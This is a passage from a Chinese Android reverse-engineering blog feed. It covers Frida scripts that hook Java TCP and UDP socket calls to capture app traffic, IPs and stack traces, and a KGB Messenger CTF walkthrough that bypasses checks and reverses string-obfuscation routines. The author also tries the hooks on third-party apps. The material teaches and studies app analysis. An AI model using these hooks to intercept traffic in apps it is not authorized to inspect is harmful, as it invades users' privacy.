        socketWrite(b, 0, b.length);	// 跟进回调
    }
-&gt;
        private void socketWrite(byte b[], int off, int len) throws IOException {


        if (len &lt;= 0 || off &lt; 0 || len &gt; b.length - off) {
            if (len == 0) {
                return;
            }
            throw new ArrayIndexOutOfBoundsException("len == " + len
                    + " off == " + off + " buffer length == " + b.length);
        }

        FileDescriptor fd = impl.acquireFD();
        try {
            // Android-added: Check BlockGuard policy in socketWrite.
            BlockGuard.getThreadPolicy().onNetwork();
            socketWrite0(fd, b, off, len);	// 继续往下跟进
        } catch (SocketException se) {
            if (impl.isClosedOrPending()) {
                throw new SocketException("Socket closed");
            } else {
                throw se;
            }
        } finally {
            impl.releaseFD();
        }
    }
-&gt;
        private native void socketWrite0(FileDescriptor fd, byte[] b, int off,
                                     int len) throws IOException;	// 到这里跟接收数据的代码一样，Java层的代码调用就结束了
</code></pre>
<ul>
<li>发送数据的调用链</li>
</ul>
<p>根据对Android源码的分析，我们hook刚才框架层调用链中的任何一个函数都可以得到它发送和接收的原始数据包，当然这里通过hook拿到的数据可能是已经加密处理过的数据</p>
<p>接下来就根据我们之前调试代码的时候分析到这些点来编写一个简单的hook代码</p>
<pre><code class="js">function hooktcp() {
    Java.perform(function () {
        var SocketClass = Java.use('java.net.Socket')
        SocketClass.$init.overload('java.lang.String', 'int').implementation = function (arg0, arg1) {
            console.log("[" + Process.getCurrentThreadId() + "]new Socket connection: " + arg0 + "port: " + arg1)
            return this.$init(arg0, arg1)
        }

        var SocketInputStreamClass = Java.use('java.net.SocketInputStream')
        // hook socketRead0()
        SocketInputStreamClass.socketRead0.implementation = function (arg0, arg1, arg2, arg3, arg4) {
            var size = this.socketRead0(arg0, arg1, arg2, arg3, arg4)
            console.log("[" + Process.getCurrentThreadId() + "]socketRead0 &gt; size: " + size)
            return size;
        }


        var SocketOutputStreamClass = Java.use('java.net.SocketOutputStream')
        // hook socketWrite0()
        SocketOutputStreamClass.socketWrite0.implementation = function (arg0, arg1, arg2, arg3) {
            var size = this.socketWrite0(arg0, arg1, arg2, arg3)
            console.log("[" + Process.getCurrentThreadId() + "]socketWrite0 &gt; size: " + arg3 + "--content: " + JSON.stringify(arg1))
            return size;
        }
    })
}

function main() {
    hooktcp()
}

setImmediate(main)
</code></pre>
<ul>
<li>hook发送和接收数据的点选择了Java层调用链最后的JNI函数</li>
</ul>
<p>执行结果：打印出了调用过程中传递的参数</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601013358738.png" class="" title="image-20240601013358738">

<p>通过hook成功的获取了通信的数据包，同样的在这个过程中如果把堆栈打印出来也就能成功的定位到是哪个地方发起了通信请求</p>
<p>添加堆栈打印代码：</p>
<pre><code class="java">function LogPrint(log) {
    var theDate = new Date();
    var hour = theDate.getHours();
    var minute = theDate.getMinutes();
    var second = theDate.getSeconds();
    var mSecond = theDate.getMilliseconds();

    hour &lt; 10 ? hour = "0" + hour : hour;
    minute &lt; 10 ? minute = "0" + minute : minute;
    second &lt; 10 ? second = "0" + second : second;
    mSecond &lt; 10 ? mSecond = "00" + mSecond : mSecond &lt; 100 ? mSecond = "0" + mSecond : mSecond;
    var time = hour + ":" + minute + ":" + second + ":" + mSecond;
    var threadid = Process.getCurrentThreadId();
    console.log("[" + time + "]" + "-&gt;threadid:" + threadid + "--" + log);

}
function printJavaStack(name) {
    Java.perform(function () {
        var Exception = Java.use("java.lang.Exception");
        var ins = Exception.$new("Exception");
        var straces = ins.getStackTrace();
        if (straces != undefined &amp;&amp; straces != null) {
            var strace = straces.toString();
            var replaceStr = strace.replace(/,/g, " \n ");
            LogPrint("=============================" + name + " Stack strat=======================");
            LogPrint(replaceStr);
            LogPrint("=============================" + name + " Stack end======================= \n ");
            Exception.$dispose();
        }
    });
}
</code></pre>
<p>执行后的打印结果：</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601022304835.png" class="" title="image-20240601022304835">

<ul>
<li>打印出来了堆栈信息，代码中还添加了打印出接收到的信息并处理了一下转为字符串</li>
</ul>
<h5 id="打印IP地址"><a href="#打印IP地址" class="headerlink" title="打印IP地址"></a>打印IP地址</h5><p>通过调试断在发送和接收数据的地方，看他的IP地址在那个字段中放着</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601223536475.png" class="" title="image-20240601223536475">

<ul>
<li>从这个地方拿到通信对端的IP和端口</li>
</ul>
<p>添加frida脚本代码</p>
<pre><code class="js">            var socketimpl = this.impl.value;
            var address = socketimpl.address.value;
            var port = socketimpl.port.value;
</code></pre>
<p>发送的时候也是一样</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601230334985.png" class="" title="image-20240601230334985">

<p>脚本跟刚才的一摸一样都不用变</p>
<pre><code class="js">            var socketimpl = this.impl.value;
            var address = socketimpl.address.value;
            var port = socketimpl.port.value;
</code></pre>
<p>添加完之后再将这些信息再打印出来</p>
<h6 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601232134172.png" class="" title="image-20240601232134172"></h6><ul>
<li>可以看到ip和端口都打印出来了</li>
</ul>
<h6 id="拿其它的App试一下"><a href="#拿其它的App试一下" class="headerlink" title="拿其它的App试一下"></a>拿其它的App试一下</h6><p>例如测试了嘿嘿连载和咸鱼的App</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601234311781.png" class="" title="image-20240601234311781">

<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240601234258302.png" class="" title="image-20240601234258302">

<ul>
<li>都可以成功拿到ip和端口</li>
</ul>
<h6 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h6><p>本章写的<a href="https://github.com/xiaoeeyu/hookTcp-demo">frida-socket抓包脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
        <tag>socket抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>Java层socket抓包与源码分析（下）</title>
    <url>/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    <content><![CDATA[<h2 id="创建demo作为分析案例"><a href="#创建demo作为分析案例" class="headerlink" title="创建demo作为分析案例"></a>创建demo作为分析案例</h2><p>本章将创建一个简单的udp通信demo，来进行分析并编写Frida Hook脚本</p>
<blockquote>
<p>服务端：<a href="https://github.com/xiaoeeyu/UdpServer-Demo">Python接收器</a></p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240602224429057.png" class="" title="image-20240602224429057">

<p>客户端：<a href="https://github.com/xiaoeeyu/okhttp2.6">App Demo</a></p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240603003631819.png" class="" title="image-20240603003631819">
</blockquote>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>跟上篇一样对接收和发送数据的流程进行hook来获取hook点</p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在<code>receive()</code>和<code>send()</code>处下断点进行调试</p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240602224543633.png" class="" title="image-20240602224543633">

<ul>
<li>以调试模式运行之后会首先断在<code>receive()</code>处</li>
</ul>
<p>这里继续F7步入</p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240602235850255.png" class="" title="image-20240602235850255">

<ul>
<li><p>记录下来最后的调用，等下在源码中查找</p>
<pre><code>java.net.DatagramSocket-&gt;receive
    java.net.PlainDatagramSocketImpl-&gt;doRecv
</code></pre>
</li>
</ul>
<p>继续往下执行断在<code>send()</code></p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240602231618715.png" class="" title="image-20240602231618715">

<p><strong>F7</strong>步入</p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240602235643806.png" class="" title="image-20240602235643806">

<ul>
<li><p>记录下来最后的调用</p>
<pre><code>java.net.DatagramSocket-&gt;send
    java.net.PlainDatagramSocketImpl-&gt;send
</code></pre>
</li>
</ul>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>在源码中查找我们刚才记录到的最后的调用</p>
<h4 id="receive"><a href="#receive" class="headerlink" title="receive"></a>receive</h4><p><code>java.net.DatagramSocket-&gt;receive     java.net.PlainDatagramSocketImpl-&gt;doRecv</code></p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240603000251123.png" class="" title="image-20240603000251123">

<pre><code class="java">143      private void doRecv(DatagramPacket p, int flags) throws IOException {	// 找到了doRecv
144          if (isClosed()) {
145              throw new SocketException("Socket closed");
146          }
147  
148          if (timeout != 0) {
149              IoBridge.poll(fd, POLLIN | POLLERR, timeout);
150          }
151  
152          IoBridge.recvfrom(false, fd, p.getData(), p.getOffset(), p.bufLength, flags, p,
153                  connected);	// 进入IoBridge类找到recvfrom()
154      }
---&gt;&gt;&gt;
606      public static int recvfrom(boolean isRead, FileDescriptor fd, byte[] bytes, int byteOffset, int byteCount, int flags, DatagramPacket packet, boolean isConnected) throws IOException {
607          int result;
608          try {
609              InetSocketAddress srcAddress = packet != null ? new InetSocketAddress() : null;
610              result = Libcore.os.recvfrom(fd, bytes, byteOffset, byteCount, flags, srcAddress);	// 进入libcore类找到os对象，再找到recvfrom()
611              result = postRecvfrom(isRead, packet, srcAddress, result);
612          } catch (ErrnoException errnoException) {
613              result = maybeThrowAfterRecvfrom(isRead, isConnected, errnoException);
614          }
615          return result;
616      }
---&gt;&gt;&gt;
</code></pre>
<p>跟进libcore类</p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240603001026632.png" class="" title="image-20240603001026632">

<ul>
<li>到了这里画个图比较清晰，最后传进来的参数是<code>linux()</code>对象</li>
</ul>
<p>跟进去Linux对象找<code>recvfrom()</code></p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240603001516258.png" class="" title="image-20240603001516258">

<ul>
<li><p>进来之后找到了<code>recvfrom()</code>它最后调用了JNI函数<code>recvfromBytes()</code></p>
<p><code>private native int recvfromBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetSocketAddress srcAddress) throws ErrnoException, SocketException;</code></p>
</li>
<li><p>还有一个意外之喜，这里也有<code>sendtoBytes()</code>方法，大概率就是我们接下来要找的<code>send()</code>的java层最终调用</p>
</li>
</ul>
<h4 id="send"><a href="#send" class="headerlink" title="send"></a>send</h4><p><code>java.net.DatagramSocket-&gt;send     java.net.PlainDatagramSocketImpl-&gt;send</code></p>
<p>跟之前一样</p>
<pre><code class="java">114      protected void send(DatagramPacket p) throws IOException {
115          if (isClosed()) {
116              throw new SocketException("Socket closed");
117          }
118          if (p.getData() == null || p.getAddress() == null) {
119              throw new NullPointerException("null buffer || null address");
120          }
121  
122          int port = connected ? 0 : p.getPort();
123          InetAddress address = connected ? null : p.getAddress();
124          IoBridge.sendto(fd, p.getData(), p.getOffset(), p.getLength(), 0, address, port);	// 进入IoBridge类找到sendto()
125      }
---&gt;&gt;&gt;
562      public static int sendto(FileDescriptor fd, byte[] bytes, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) throws IOException {
563          boolean isDatagram = (inetAddress != null);
564          if (!isDatagram &amp;&amp; byteCount &lt;= 0) {
565              return 0;
566          }
567          int result;
568          try {
569              result = Libcore.os.sendto(fd, bytes, byteOffset, byteCount, flags, inetAddress, port);	// 这里跟刚才一样进入libcore类找到os对象，再找到recvfrom()
570          } catch (ErrnoException errnoException) {
571              result = maybeThrowAfterSendto(isDatagram, errnoException);
572          }
573          return result;
574      }
</code></pre>
<p>进来之后我们把调用的图画出来</p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240603002716445.png" class="" title="image-20240603002716445">

<p>最后调用的Java层JNI函数是<code>sendtoBytes()</code>：这个函数有两个重载，我们调用的是七个参数的重载</p>
<p><code>private native int sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) throws ErrnoException, SocketException;</code></p>
<h3 id="写hook代码"><a href="#写hook代码" class="headerlink" title="写hook代码"></a>写hook代码</h3><p>直接hook最后的这两个JNI函数，并且把其中传递的buf以及IP等信息打印出来</p>
<pre><code class="js">function hookudp() {
    Java.perform(function () {
        var LinuxClass = Java.use('libcore.io.Linux')
        // 数据接收
        // private native int recvfromBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetSocketAddress srcAddress) throws ErrnoException, SocketException;
        LinuxClass.recvfromBytes.implementation = function (arg0, arg1, arg2, arg3, arg4,arg5) {
            var size = this.recvfromBytes(arg0, arg1, arg2, arg3, arg4, arg5)

            var byteArray = Java.array('byte', arg1)
            var content = ""
            for(var i = 0; i &lt; size; i++){
                content = content + String.fromCharCode(byteArray[i])
            }
            console.log("address" + arg5 + "[" + Process.getCurrentThreadId() + "]socketRead0 &gt; size: " + size + "--content: " + content)

            printJavaStack('recvfromBytes...')
            return size;
        }

        // 发送数据这里使用的是七个参数的重载
        // private native int sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port) throws ErrnoException, SocketException;
        LinuxClass.sendtoBytes.overload('java.io.FileDescriptor', 'java.lang.Object', 'int', 'int', 'int', 'java.net.InetAddress', 'int').implementation = function (arg0, arg1, arg2, arg3, arg4, arg5, arg6) {
            var size = this.sendtoBytes(arg0, arg1, arg2, arg3, arg4, arg5, arg6)

            var byteArray = Java.array('byte', arg1)
            var content = "";
            for(var i=0; i&lt;size; i++){
                content = content + String.fromCharCode(byteArray[i])
            }
            console.log("address" + arg5 + ":" + arg6 + "[" + Process.getCurrentThreadId() + "]sendtoBytes &gt; len: " + size + "--content: " + content)
            
            printJavaStack('sendtoBytes()...')
            return size;
        }
    })
}
</code></pre>
<h4 id="打印的结果"><a href="#打印的结果" class="headerlink" title="打印的结果"></a>打印的结果</h4><p>把打印结果写入文件方便查看</p>
<p><code>frida -U -f com.example.okhttp  -l hookUDP.js  --no-pause -o udp.log</code></p>
<img src="/2024/06/02/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/image-20240602183020968.png" class="" title="image-20240602183020968">



<h6 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h6><p><a href="https://github.com/xiaoeeyu/hookUdp-demo">完整的Frida Hook代码</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
        <tag>socket抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>KGBMessager解密</title>
    <url>/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>本章主要内容为：</p>
<blockquote>
<ol>
<li>spawn/attach时机的选择</li>
<li>主动调用</li>
<li>hook时机选择</li>
<li>制作自己的dex并动态加载</li>
<li>使用Z3求解/符号执行</li>
</ol>
</blockquote>
<span id="more"></span>

<hr>
<p>本章用<code>KGB Messenger</code>为案例来进行</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125105905234.png" class="" title="image-20231125105905234">

<ul>
<li>弹窗提示只能运行在Russian的设备上，回头可以再jadx里面搜索这个字符串定位</li>
</ul>
<h4 id="惯例先用jadx打开拿到包名，然后用objection查看一下基本信息"><a href="#惯例先用jadx打开拿到包名，然后用objection查看一下基本信息" class="headerlink" title="惯例先用jadx打开拿到包名，然后用objection查看一下基本信息"></a>惯例先用jadx打开拿到包名，然后用objection查看一下基本信息</h4><img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125110719813.png" class="" title="image-20231125110719813">

<ul>
<li>查看activity，都可以直接跳转过去</li>
</ul>
<h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><h3 id="通过地区校验"><a href="#通过地区校验" class="headerlink" title="通过地区校验"></a>通过地区校验</h3><p>这个地区校验比较简单，只是检查一下主目录</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125111547356.png" class="" title="image-20231125111547356">

<ul>
<li>搜索字符串可以直接定位的到</li>
</ul>
<p>定位到这里之后</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125112048538.png" class="" title="image-20231125112048538">

<ul>
<li><p>可以看到这里有<strong>两次校验</strong>，校验通过才能进入到<code>LoginActivity.class</code></p>
<blockquote>
<p>第一次校验：<code>System.getProperty</code>方法的返回值等于“Russia”，就能通过</p>
<p>第二次校验：<code>System.getenv</code>方法的返回值等于白名单中的值，就能通过</p>
</blockquote>
</li>
</ul>
<h5 id="第一次校验："><a href="#第一次校验：" class="headerlink" title="第一次校验："></a>第一次校验：</h5><ul>
<li><p>hook<code>System.getProperty</code>方法</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125113128443.png" class="" title="image-20231125113128443">

<ul>
<li>在Smali代码中可以看到它的包名和重载参数</li>
<li>可以写脚本hook返回值</li>
</ul>
</li>
</ul>
<h5 id="第二次校验："><a href="#第二次校验：" class="headerlink" title="第二次校验："></a>第二次校验：</h5><ul>
<li><p>根据代码中的<code>getResources()</code>我们可以知道白名单在资源文件中，位置通常在 <code>res/values/strings.xml</code> 文件中</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125115558462.png" class="" title="image-20231125115558462"></li>
</ul>
<h5 id="校验结果"><a href="#校验结果" class="headerlink" title="校验结果"></a>校验结果</h5><p>写脚本直接修改返回值就可以，之前几篇文章写过很多次了</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125115948170.png" class="" title="image-20231125115948170">

<ul>
<li>通过之后就可以看到app已经进入到了登陆界面</li>
</ul>
<h3 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h3><p>先随便输入账号密码，看看有什么提示</p>
<blockquote>
<p>提示：“User not recognized”</p>
</blockquote>
<p>那我们就先再jadx中尝试定位这个字符串，在<strong>LoginActivity</strong>中定位到了这个字符串</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125121610998.png" class="" title="image-20231125121610998">

<ul>
<li><p>在这个校验中我们需要先通过用户名的验证：</p>
<ul>
<li>用户名来也来自资源文件，可以直接去刚才找白名单的地方找</li>
</ul>
</li>
<li><p>然后是密码的验证</p>
<ul>
<li><p>通过<code>j()</code>方法的校验就可以，那我们去看一下这个方法</p>
<blockquote>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125171107281.png" class="" title="image-20231125171107281">

<ul>
<li>这里可以看到是对传进来的密码进行了一个摘要算法，然后看结果跟资源文件中保存的password是否相等</li>
<li>去看看资源文件中的password是什么</li>
</ul>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125123009573.png" class="" title="image-20231125123009573">

<ul>
<li><p>用户名是明文：<code>codenameduchess</code></p>
</li>
<li><p>password是一个摘要：<code>84e343a0486ff05530df6c705c8bb4</code></p>
</li>
<li><p>拿这个摘要去网上搜索一下看能不能搜到它的明码</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125123736772.png" class="" title="image-20231125123736772"></li>
</ul>
</blockquote>
</li>
</ul>
</li>
</ul>
<h6 id="验证登陆"><a href="#验证登陆" class="headerlink" title="验证登陆"></a>验证登陆</h6><p>输入我们拿到的用户名和密码</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125124610567.png" class="" title="image-20231125124610567">

<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125124828366.png" class="" title="image-20231125124828366">

<ul>
<li>通过校验，进入了聊天界面，拿到了FLAG</li>
</ul>
<p>登陆完成进入到了聊天框，接下来考虑怎么输入正确的”接头暗号“获取它们都知道的密码</p>
<p>先搜索这些聊天的字符串，看能定位到什么</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125221647017.png" class="" title="image-20231125221647017">

<ul>
<li>看这里的代码逻辑首先，我们先让①、②处的校验通过，然后再保证我们输入的字符串能通过③处的校验</li>
</ul>
<p>①和②处的校验很简单，我们只需要修改<code>a()</code>和<code>b()</code>的返回值就可以通过校验，可以先试一下</p>
<blockquote>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125205819457.png" class="" title="image-20231125205819457">

<p>修改返回值的hook脚本</p>
<pre><code class="js">    Java.use('com.tlamb96.kgbmessenger.MessengerActivity').a.implementation = function(x){
        console.log(x)
        return Java.use('java.lang.String').$new('V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003')
    }
    Java.use('com.tlamb96.kgbmessenger.MessengerActivity').b.implementation = function(x){
        console.log(x)
        return Java.use('java.lang.String').$new('\u0000dslp}oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000')
    }
</code></pre>
<ul>
<li>这里比较简单就能通过</li>
</ul>
</blockquote>
<p>然后我们来看③处的<code>i()</code>方法</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125210440418.png" class="" title="image-20231125210440418">

<ul>
<li>要对我们输入进来的<strong>q</strong>和<strong>s</strong>进行校验，用返回的值作为FLAG</li>
<li>这里没其它办法我们只能来逆向这个算法，拿到这两个正确的字符串了，如果通过hook直接过来，这两个字符串是空它会嘲笑我们(╬▔皿▔)╯</li>
</ul>
<h3 id="算法逆向"><a href="#算法逆向" class="headerlink" title="算法逆向"></a>算法逆向</h3><p>这两个字符串分别是通过<code>a()</code>和<code>b()</code>校验的，一个一个来分析</p>
<h4 id="a"><a href="#a" class="headerlink" title="a()"></a>a()</h4><img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125222056250.png" class="" title="image-20231125222056250">

<ul>
<li>我们输入的字符串经过<code>a()</code>运算之后需要等于p的值</li>
</ul>
<p>看一下<code>a()</code>的算法</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125222305478.png" class="" title="image-20231125222305478">

<ul>
<li>这只是一个简单的异或算法，根据异或的特性我们知道只需要把结果反过来异或一遍，就能得到原字符串</li>
</ul>
<h6 id="编译dex，并主动调用通过验证"><a href="#编译dex，并主动调用通过验证" class="headerlink" title="编译dex，并主动调用通过验证"></a>编译dex，并主动调用通过验证</h6><p>用Android studio创建一个空的java项目，新建一个类</p>
<pre><code class="java">public class reverseA {
    public static String decode_P(){
        String p = "V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003";
        String result = a(p);
        return result;
    }
    private static String a(String str) {
        char[] charArray = str.toCharArray();
        for (int i = 0; i &lt; charArray.length / 2; i++) {
            char c = charArray[i];
            charArray[i] = (char) (charArray[(charArray.length - i) - 1] ^ 'A');
            charArray[(charArray.length - i) - 1] = (char) (c ^ '2');
        }
        return new String(charArray);
    }
}
</code></pre>
<ul>
<li><p>将这段代码编译为dex，push到手机上试一下</p>
<blockquote>
<ol>
<li><p>写完代码之后按<code>ctrl + F9</code>构建</p>
</li>
<li><p>然后再文件中找到这个class文件，用d8工具打包成dex</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125221229811.png" class="" title="image-20231125221229811">
</li>
<li><p>push到手机上</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125221406006.png" class="" title="image-20231125221406006"></li>
</ol>
</blockquote>
</li>
</ul>
<h6 id="写个js脚本调用这个dex"><a href="#写个js脚本调用这个dex" class="headerlink" title="写个js脚本调用这个dex"></a>写个js脚本调用这个dex</h6><pre><code class="js">Java.perform(function(){
    Java.openClassFile("/data/local/tmp/classes.dex").load();
    var reverseA =Java.use("com.xiaoeryu.lesson9.reverseA");
    console.log(reverseA.decode_P());
}); 
</code></pre>
<p>计算结果：</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125222751338.png" class="" title="image-20231125222751338">

<p>测试：</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125223008964.png" class="" title="image-20231125223008964">

<ul>
<li>测试ok</li>
<li>接下来分析第二个字符串</li>
</ul>
<h4 id="b"><a href="#b" class="headerlink" title="b()"></a>b()</h4><img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125223416442.png" class="" title="image-20231125223416442">

<ul>
<li>同样，这里也是将我们输入的字符串经过<code>b()</code>运算后要等于<code>r</code>的值</li>
</ul>
<p>看一下<code>b()</code>方法</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125223711810.png" class="" title="image-20231125223711810">

<ul>
<li><p>可以看到这个算法就比之前的稍微要麻烦一点，里面有移位、异或、逆序交换</p>
</li>
<li><p>我们先来分析一下</p>
<blockquote>
<p>总共分为两部分：</p>
<ol>
<li><code>((charArray[i] &gt;&gt; (i % 8)) ^ charArray[i])</code>这是一个简单的位运算，通过右移然后异或，对字符进行了加密</li>
<li>第二部分是将加密后的字符进行逆序交换</li>
</ol>
</blockquote>
</li>
</ul>
<p>分析完成了我们来写一下它的解密算法：写python脚本暴力枚举所有字符就可以。<em>当然写在Android Studio写成Java代码编译成一个dex用注入的方式获取同样也是可以的，代码放在附件中（注入的流程跟解密<code>a()</code>方法相同）。</em></p>
<pre><code class="python">characterSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~ \t\n\r"
characterSetArray = list(characterSet)

EnStr = "\000dslp}oQ\000 dks$|M\000h +AYQg\000P*!M$gQ\000"
EnStrArray = list(EnStr)

# 把EnStrArray进行逆序交换
for i in range(int(len(EnStrArray)/2)):
    c = EnStrArray[i]
    EnStrArray[i] = EnStrArray[len(EnStrArray)-i-1]
    EnStrArray[len(EnStrArray)-i-1] = c

# 暴力枚举EnStrArray的明文
raw_text = ""
for i in range(len(EnStrArray)):
    for j in range(len(characterSetArray)):
        c = characterSetArray[j]
        result = chr((ord(c) &gt;&gt; (i % 8)) ^ ord(c))
        if result == EnStrArray[i]:
            raw_text += c
            break

print(raw_text)
</code></pre>
<p>执行结果：</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231126163043261.png" class="" title="image-20231126163043261">

<p>将结果输入：</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231126163659903.png" class="" title="image-20231126163659903">

<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231126163607474.png" class="" title="image-20231126163607474">



